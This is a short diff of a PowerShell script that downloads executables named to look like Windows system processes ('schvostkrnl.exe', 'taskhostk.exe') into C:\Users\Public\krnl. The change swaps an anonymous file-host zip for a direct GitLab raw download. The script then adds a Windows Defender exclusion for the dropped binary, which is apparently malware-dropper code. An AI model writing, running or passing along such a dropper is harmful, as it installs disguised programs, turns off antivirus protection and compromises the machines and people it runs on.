@@ -2,9 +2,7 @@ New-Item -ItemType Directory -Path C:\Users\Public\krnl
 
 Invoke-WebRequest -Uri "https://raw.githubusercontent.com/milujemnastenky/bombardini-gusini/main/apps/schvostkrnl.exe" -OutFile "C:\Users\Public\krnl\schvostkrnl.exe"
 
-Invoke-WebRequest -Uri "https://anonymfile.com/VxpWx/taskhostk.zip" -OutFile "C:\Users\Public\krnl\taskhostk.zip"
-
-Expand-Archive -Force "C:\Users\Public\krnl\taskhostk.zip" "C:\Users\Public\krnl"
+Invoke-WebRequest -Uri "https://gitlab.com/cs980414/cs/-/raw/main/taskhostk.exe" -OutFile "C:\Users\Public\krnl\taskhostk.exe"
 
 Add-MpPreference -ExclusionPath "C:\Users\Public\krnl\schvostkrnl.exe"
 
